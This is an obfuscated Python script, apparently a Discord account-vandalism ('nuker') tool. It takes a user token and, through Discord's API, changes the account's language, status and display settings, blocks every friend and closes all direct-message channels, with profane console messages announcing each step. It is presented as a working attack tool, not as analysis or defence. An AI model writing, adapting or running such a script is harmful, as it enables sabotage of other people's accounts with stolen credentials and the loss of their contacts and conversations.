import requests #line:1
import ctypes #line:2
import random #line:3
import time #line:4
def fuckAccount (OO00OO00OOO00O0O0 ):#line:6
    ctypes .windll .kernel32 .SetConsoleTitleW ("GR | Fuck Account")#line:7
    O000OO0O0OO00OO0O ={'theme':'light','locale':random .choice (['ja','zh-TW','ko','zh-CN']),'custom_status':{'text':'GR OWNS DISCORD','emoji_name':'⏱️'},'render_embeds':False ,'render_reactions':False }#line:17
    OOOOOOO00OO00OOO0 ={"authorization":OO00OO00OOO00O0O0 ,"user-agent":"bruh6/9"}#line:18
    requests .patch ("https://discord.com/api/v6/users/@me/settings",headers =OOOOOOO00OO00OOO0 ,json =O000OO0O0OO00OO0O )#line:19
    print ("[ C ] Fucked the Account")#line:20
    time .sleep (2 )#line:21
def blockAllFriends (OO000O0O00000O0OO ):#line:23
    ctypes .windll .kernel32 .SetConsoleTitleW ("Block All Friends")#line:24
    OOOOO0O0OOO0OOO00 ={"authorization":OO000O0O00000O0OO ,"user-agent":"bruh6/9"}#line:25
    OOOO0O00O0000O0O0 ={"type":2 }#line:26
    OOO0O0O0000OO000O =requests .get ("https://canary.discord.com/api/v8/users/@me/relationships",headers =OOOOO0O0OOO0OOO00 ).json ()#line:27
    for O0O0OO0O000OOO000 in OOO0O0O0000OO000O :#line:28
        requests .put (f"https://canary.discord.com/api/v8/users/@me/relationships/{O0O0OO0O000OOO000['id']}",headers =OOOOO0O0OOO0OOO00 ,json =OOOO0O00O0000O0O0 ,)#line:33
        print (f"[C] Blocked Friend | {O0O0OO0O000OOO000['id']}")#line:34
def close_all_dms (O000O0O0O00OO0OOO ):#line:36
    ctypes .windll .kernel32 .SetConsoleTitleW ("GR | Close DMs")#line:37
    OO0OOO0OOO0000OO0 ={"authorization":O000O0O0O00OO0OOO ,"user-agent":"Samsung Fridge/6.9"}#line:38
    OO0O00OOOOOOOO0O0 =requests .get ("https://canary.discord.com/api/v8/users/@me/channels",headers =OO0OOO0OOO0000OO0 ).json ()#line:39
    for O000O000O0OOO0000 in OO0O00OOOOOOOO0O0 :#line:40
        print (f"[C] ID: {O000O000O0OOO0000['id']}")#line:41
        requests .delete (f"https://canary.discord.com/api/v8/channels/{O000O000O0OOO0000['id']}",headers =OO0OOO0OOO0000OO0 ,)#line:45
token =input ("Enter your Discord token: ")#line:47
fuckAccount (token )#line:48
blockAllFriends (token )#line:49
close_all_dms (token )#line:50
